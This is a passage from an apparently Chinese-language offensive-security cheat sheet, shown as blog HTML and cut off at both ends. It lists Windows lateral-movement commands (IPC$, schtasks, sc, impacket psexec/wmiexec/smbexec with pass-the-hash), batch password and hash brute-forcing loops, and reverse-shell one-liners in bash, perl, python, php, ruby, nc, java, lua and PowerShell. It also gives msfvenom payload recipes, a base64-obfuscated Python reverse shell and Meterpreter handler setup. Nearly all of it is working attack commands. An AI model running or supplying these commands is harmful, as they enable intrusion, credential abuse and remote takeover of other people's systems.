class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span>查看端口代理配置信息<br><br>Reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber 查看远程桌面端口号<br><br></code></pre></td></tr></table></figure>

<h2 id="at-amp-schtasks-amp-sc横向"><a href="#at-amp-schtasks-amp-sc横向" class="headerlink" title="at&amp;schtasks&amp;sc横向"></a>at&amp;schtasks&amp;sc横向</h2><p>使用明文密码登录到目标，需要445和139端口开启：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">net use \\192.168.2.148\ipc$ password <span class="hljs-string">/user</span><span class="hljs-function">:test</span>\administrator<br><br>net use \\192.168.2.148\ipc$ password <span class="hljs-string">/user</span><span class="hljs-function">:administrator</span><br><br>复制文件<br>copy c:\1.exe \\192.168.2.148\c$<br><br>at新建10<span class="hljs-function">:10</span>分运行的定时作业<br>at \\192.168.2.148 10<span class="hljs-function">:10</span> c:\1.exe<br><br>Windows server 2012及以上使用schtasks命令<br>Schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/s</span> 192.168.2.148 <span class="hljs-string">/ru</span> “SYSTEM” <span class="hljs-string">/tn</span> executefile <span class="hljs-string">/sc</span> DAILY <span class="hljs-string">/tr</span> c:<span class="hljs-string">/1.exe</span> <span class="hljs-string">/F</span><br>Schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/s</span> 192.168.2.148 <span class="hljs-string">/tn</span> executefile <span class="hljs-string">/i</span><br>Schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/s</span> 192.168.2.148 <span class="hljs-string">/tn</span> executefile <span class="hljs-string">/f</span><br><br>sc \\192.168.210.107 create hacker binpath=<span class="hljs-string">&quot;c:\shell1.exe&quot;</span>   <span class="hljs-comment">#创建服务</span><br>sc \\192.168.210.107 start hacker      <span class="hljs-comment">#启动hacker服务</span><br></code></pre></td></tr></table></figure>

<h2 id="impacket包横向命令"><a href="#impacket包横向命令" class="headerlink" title="impacket包横向命令"></a>impacket包横向命令</h2><p>下载<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a><br><a target="_blank" rel="noopener" href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a><br>Atexec</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">需要<span class="hljs-number">445</span>端口开启<br><span class="hljs-title class_">Atexec</span>.exe hacker/<span class="hljs-symbol">administrator:</span>abc123<span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-title class_">Atexec</span>.exe -hashes <span class="hljs-symbol">:fac5d668099409cb6fa223a32ea493b6</span> hacker/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>


<p>dcomexec</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">需要<span class="hljs-number">135</span>端口开启<br>dcomexec.exe hacker/<span class="hljs-symbol">administrator:</span>abc123<span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>dcomexec.exe -hashes <span class="hljs-symbol">:fac5d668099409cb6fa223a32ea493b6</span> hacker/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>

<p>psexec</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">官方<span class="hljs-title class_">Psexec</span>第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：<br><span class="hljs-title class_">Net</span> <span class="hljs-keyword">use</span> \<span class="hljs-number">192.168</span>.<span class="hljs-number">202.148</span>\ipc<span class="hljs-variable">$ </span>zxcvbnm123 /<span class="hljs-symbol">user:</span>test\<span class="hljs-title class_">Administrator</span><br><span class="hljs-title class_">Psexec</span> \<span class="hljs-number">192.168</span>.<span class="hljs-number">202.148</span> -accepteula -s cmd<br><br>官方<span class="hljs-title class_">Psexec</span>第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递<br><span class="hljs-title class_">Psexec</span> \<span class="hljs-number">192.168</span>.<span class="hljs-number">202.148</span> -u <span class="hljs-title class_">Administrator</span> -p zxcvbnm123 -s cmd<br><br><span class="hljs-title class_">PsExec</span> -hashes <span class="hljs-symbol">:fac5d668099409cb6fa223a32ea493b6</span> test.com/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span> <span class="hljs-string">&quot;whoami&quot;</span> (官方提供的exe执行不了)<br></code></pre></td></tr></table></figure>

<p>smbexec</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">需要<span class="hljs-number">445</span>端口开启<br><span class="hljs-title class_">Smbexec</span> test/<span class="hljs-symbol">Administrator:</span>zxcvbnm123<span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span><br><span class="hljs-title class_">Smbexec</span> -hashes <span class="hljs-symbol">:fac5d668099409cb6fa223a32ea493b6</span> test/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.202</span>.<span class="hljs-number">148</span><br></code></pre></td></tr></table></figure>

<p>wmi</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">WMI利用135端口，支持明文和<span class="hljs-built_in">hash</span>两种方式进行身份验证，且系统日志不记录。<br>第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）<br>Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;C:/1.txt&quot;</span><br><br>第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀<br>Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123<br><br>第三种：使用第三方impacket套件中的Wmiexec进行明文或<span class="hljs-built_in">hash</span>传递，执行结果有回显<br>Wmiexec <span class="hljs-built_in">test</span>/Administrator:zxcvbnm123@192.168.202.148 <span class="hljs-string">&quot;whoami&quot;</span><br>Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 <span class="hljs-built_in">test</span>/Administrator@192.168.202.148 <span class="hljs-string">&quot;whoami&quot;</span><br><br></code></pre></td></tr></table></figure>

<p>批量操作,需要保存为bat执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">用已知密码和用户，批量连接ip:<br>FOR /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> net use \%%i\ipc$ “password” /user:hacker\administrator<br><br>已知用户和ip，批量连接密码(爆破密码)：<br>FOR /F %%i <span class="hljs-keyword">in</span> (pass.txt) <span class="hljs-keyword">do</span> net use \192.168.202.148\ipc$ <span class="hljs-string">&quot;%%i&quot;</span> /user:<span class="hljs-built_in">test</span>\administrator<br><br>已知用户和ip，批量连接<span class="hljs-built_in">hash</span>(爆破<span class="hljs-built_in">hash</span>)：<br>FOR /F %%i <span class="hljs-keyword">in</span> (hash.txt) <span class="hljs-keyword">do</span> atexec.exe -hashes :<span class="hljs-string">&quot;%%i&quot;</span> <span class="hljs-built_in">test</span>/administrator@192.168.202.148 <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>

<p>cme 批量</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains<span class="hljs-number">4</span> ./cme smb <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">24</span> -u administrator -H <span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span> -d xx.org -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;net user&quot;</span><br></code></pre></td></tr></table></figure>

<p>单独执行命令</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">192.168.10.11</span> -u Administrator -p <span class="hljs-string">&#x27;P<span class="hljs-variable">@ssw0rd</span>&#x27;</span> -x whoami<br></code></pre></td></tr></table></figure>

<p>ldap喷洒</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cme</span> ldap <span class="hljs-number">10.11.12.211</span> -u <span class="hljs-string">&#x27;username&#x27;</span> -p <span class="hljs-string">&#x27;password&#x27;</span> --kdcHost <span class="hljs-number">10.11.12.211</span> --users<br></code></pre></td></tr></table></figure>


<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">172.16.1.130</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-attribute">exec</span> <span class="hljs-number">5</span>&lt;&gt;/dev/tcp/<span class="hljs-number">172.16.1.130</span>/<span class="hljs-number">4444</span>;cat &lt;&amp;<span class="hljs-number">5</span>|while read line;do $line &gt;&amp;<span class="hljs-number">5</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>;done<br></code></pre></td></tr></table></figure>

<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;10.0.0.1&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">1234</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.31.41&quot;</span>,<span class="hljs-number">8080</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.0.0.1&quot;</span>,<span class="hljs-number">1234</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ruby -rsocket -<span class="hljs-string">e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -e <span class="hljs-regexp">/bin/</span>sh <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span><br>rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br>nc x.x.x.x <span class="hljs-number">8888</span>|<span class="hljs-regexp">/bin/</span>sh|nc x.x.x.x <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>

<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure>

<h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">lua -e &quot;require(<span class="hljs-string">&#x27;socket&#x27;</span>);require(<span class="hljs-string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;1234&#x27;</span>);os.execute(<span class="hljs-string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;<br></code></pre></td></tr></table></figure>

<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span>9a3c747bcf535ef82dc4c5c66aac36db47c2afde<span class="hljs-operator">/</span>Shells<span class="hljs-operator">/</span>Invoke-PowerShellTcp.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">172.16</span>.<span class="hljs-number">1.130</span> -port <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<h2 id="加密shell"><a href="#加密shell" class="headerlink" title="加密shell"></a>加密shell</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkfifo <span class="hljs-regexp">/tmp/</span>s; <span class="hljs-regexp">/bin/</span>sh -i &lt; <span class="hljs-regexp">/tmp/</span>s <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | openssl s_client -quiet -connect <span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>:<span class="hljs-number">2333</span> &gt; <span class="hljs-regexp">/tmp/</span>s; rm <span class="hljs-regexp">/tmp/</span>s<br><br></code></pre></td></tr></table></figure>

<h1 id="msf大全"><a href="#msf大全" class="headerlink" title="msf大全"></a>msf大全</h1><p>到处抄的</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/270456.html">https://www.freebuf.com/articles/web/270456.html</a></p>
<p><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/79.html">https://saucer-man.com/information_security/79.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235631">https://www.anquanke.com/post/id/235631</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span><br>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="hljs-built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall<br>安装目录 <br><span class="hljs-comment"># /opt/metasploit-framework/embedded/framework/</span><br></code></pre></td></tr></table></figure>

<p>payload生成</p>
<p>Linux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">反向连接：<br>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf<br>正向连接：<br>msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure>

<p>Windows</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>

<p>Mac</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php<br><span class="hljs-built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>

<p>ASP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure>

<p>JSP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure>

<p>WAR</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war<br></code></pre></td></tr></table></figure>

<p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php shell.php<br></code></pre></td></tr></table></figure>

<p>3.脚本shell</p>
<p>Python</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py<br></code></pre></td></tr></table></figure>

<p>Bash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh<br></code></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure>

<p>执行方式：复制shell.py中的内容在linux命令行下执行：</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;exec(<span class="hljs-string">&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>))&quot;<br></code></pre></td></tr></table></figure>

<p>4.shellcode<br>Linux Based Shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br></code></pre></td></tr></table></figure>

<p>Windows Based Shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br></code></pre></td></tr></table></figure>

<p>Mac Based Shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br></code></pre></td></tr></table></figure>

<h2 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.81.160<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br>exploit -j -z <span class="hljs-comment"># -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="hljs-built_in">jobs</span>  <span class="hljs-comment"># 查看后台攻击任务 </span><br><span class="hljs-built_in">kill</span> &lt;<span class="hljs-built_in">id</span>&gt;  <span class="hljs-comment"># 停止某后台攻击任务 </span><br>sessions -l  <span class="hljs-comment"># (查看会话)</span><br>sessions -i 2   <span class="hljs-comment"># 选择会话</span><br>sessions -k 2   <span class="hljs-comment"># 结束会话</span><br></code></pre></td></tr></table></figure>

<p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p>
<p>获取到了meterpreter，就可以进行后渗透了。</p>
<h3 id="基本系统命令"><a href="#基本系统命令" class="headerlink" title="基本系统命令"></a>基本系统命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 